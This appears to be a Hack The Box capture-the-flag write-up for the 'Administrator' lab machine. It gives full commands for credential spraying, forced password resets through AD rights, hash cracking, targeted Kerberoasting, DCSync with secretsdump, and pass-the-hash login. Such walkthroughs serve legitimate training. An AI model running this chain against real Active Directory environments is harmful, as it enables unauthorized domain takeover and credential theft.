# -HTB-Administrator


### I start with nmap 

```
nmap -p- -sVC 10.10.11.42 -oN nmap_scan --min-rate 5000 -vv 
```

<img width="1249" height="859" alt="image" src="https://github.com/user-attachments/assets/8a686a15-54c8-4398-9589-1d8824e398cf" />


### I test the creds

```
Olivia:ichliebedich
```

```
nxc smb 10.10.11.42 -u "Olivia" -p "ichliebedich"
```

```
nxc winrm 10.10.11.42 -u "Olivia" -p "ichliebedich" 
```

<img width="1450" height="214" alt="image" src="https://github.com/user-attachments/assets/b98da1c7-a48e-4695-87c2-74feb9b5cb89" />


### I colect the zip for bloodhound 

```
nxc ldap DC.administrator.htb -u 'Olivia' -p 'ichliebedich'  --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

# Winrm -> Olivia ( GenericAll )

```
evil-winrm -i 10.10.11.42 -u "Olivia" -p 'ichliebedich'
```


### On BloodHound we can se Olivia have GenericAll to Michel 

<img width="1795" height="771" alt="image" src="https://github.com/user-attachments/assets/50091dc9-ffb8-490a-a3b8-9224432f9a80" />


### We change Michel passwd


```
$pssw = ConvertTo-SecureString "Password123@" -AsPlainText -Force
```

```
Set-ADAccountPassword -Identity "CN=MICHAEL WILLIAMS,CN=Users,DC=Administrator,DC=HTB" -NewPassword $pw -Reset
```

```
nxc smb 10.10.11.42 -u "MICHAEL" -p "Password123@"
```

<img width="1295" height="83" alt="image" src="https://github.com/user-attachments/assets/cb2b0f0b-aa1a-4e37-8f22-2491f854979a" />


# Michel -> Benjamin ( ForceChangePassword )

<img width="1055" height="230" alt="image" src="https://github.com/user-attachments/assets/9817799c-379f-4ae3-86de-585fb9321d36" />


### We cannect to Michel and chnage Benjamin passwd


```
evil-winrm -i 10.10.11.42 -u "MICHAEL" -p "Password123@" 
```

```
cd c:\programdata
```

### We upload powerview



```
upload PowerView.ps1
```

```
. .\PowerView.ps1
```

### And change passwd


```
$newpass = ConvertTo-SecureString 'Password1234@' -AsPlainText -Force
```

```
Set-DomainUserPassword -Identity BENJAMIN  -AccountPassword $newpass
```


<img width="1276" height="82" alt="image" src="https://github.com/user-attachments/assets/958a2308-a4ce-4cf4-9ee1-5f555a6d3b78" />



# Benjamin -> ?


### We can see benjamin it s member of Share Moderators Group , and on the nmap we have ftb open , so let s try that 


<img width="781" height="172" alt="image" src="https://github.com/user-attachments/assets/6c3348b6-436c-479f-836e-7b7913bd2f80" />


```
ftp BENJAMIN@10.10.11.42
```
```
Password1234@ -> passwd
```

### And we find a Backup.psfe3


```
Backup.psafe3
```
```
get Backup.psafe3
```

<img width="1447" height="393" alt="image" src="https://github.com/user-attachments/assets/40cf8a03-9525-46c5-8bc0-36af5007a971" />


### We use hashcat to crack-it

```
hashcat Backup.psafe3 /usr/share/wordlists/rockyou.txt -m 5200
```

### And we find the passwd for backup

```
Backup.psafe3:tekieromucho
```

### Now we can open with pwsafe


```
pwsafe Backup.psafe3 
```

<img width="568" height="424" alt="image" src="https://github.com/user-attachments/assets/5277d2ee-8dfe-44b3-bdab-5005dc16552b" />


### Now we can right click the name individualy and Copy Passwd To Clipboard


<img width="651" height="380" alt="image" src="https://github.com/user-attachments/assets/b36bf192-b145-40a9-a55a-a5d4e338f93d" />


### We create a passwd list with them . And we find all the username from winrm 

```
UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

<img width="391" height="93" alt="image" src="https://github.com/user-attachments/assets/af14f1ff-32a7-4718-90e7-9b7609f1b7e9" />


```
net user
```

<img width="684" height="174" alt="image" src="https://github.com/user-attachments/assets/c029200b-f947-4cb9-8a9b-e3d4653a7486" />

```
Administrator            
alexander                
benjamin
emily                    
emma                     
ethan
Guest                    
krbtgt                   
michael
olivia
```

<img width="338" height="206" alt="image" src="https://github.com/user-attachments/assets/39c9046d-15ef-461a-8eb8-db77808e378b" />


### Now we try all with smb / winrm 

```
nxc smb 10.10.11.42 -u users -p pss  
```

### And we have a hit on emily

<img width="1328" height="310" alt="image" src="https://github.com/user-attachments/assets/f5426950-0d0f-45d2-b39c-13ad12494c85" />

```
evil-winrm -i 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

# And we have users flag in "C:\Users\emily\Desktop"


<img width="598" height="267" alt="image" src="https://github.com/user-attachments/assets/377954be-360c-47ed-9c61-39f48e63cb6e" />

# Emily -> Ethan ( Generic Write ) 

<img width="1413" height="734" alt="image" src="https://github.com/user-attachments/assets/32236007-2b87-4486-8847-3783cbb79e55" />

### First i try to type out the desktop of Ethan , but was emplty , so ...


### We use a targeted Kerberos attack with the fallow cmd : https://github.com/ShutdownRepo/targetedKerberoast

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```


```
python3 -m venv .env 
```


```
cd targetedKerberoast 
```

```
pip install -r requirements.txt
```

```
sudo ntpdate 10.10.11.42 
```

```
python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt
```

### And we find the Ethan passwd 

```
ethan:limpbizkit
```

# Ethan -> Administrator ( DCSync )

<img width="1180" height="268" alt="image" src="https://github.com/user-attachments/assets/c777f154-3e05-4d5b-bc00-d89ab00ac70d" />


### We use secretdump to dump the administrator hash 


```
impacket-secretsdump -just-dc administrator.htb/ethan@10.10.11.42
```

<img width="1451" height="670" alt="image" src="https://github.com/user-attachments/assets/3a3a9109-fdd2-4353-b1f3-4d892a394ec3" />


```
Administrator : Hash -> 3dc553ce4b9fd20bd016e098d2d2fd2e
```

### And we can connet with winrm and get the root flag 


```
evil-winrm -i 10.10.11.42 -u Administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

```
C:\Users\Administrator\Desktop
```

<img width="547" height="234" alt="image" src="https://github.com/user-attachments/assets/491f6feb-655c-42fa-9c02-a1350c9421bf" />




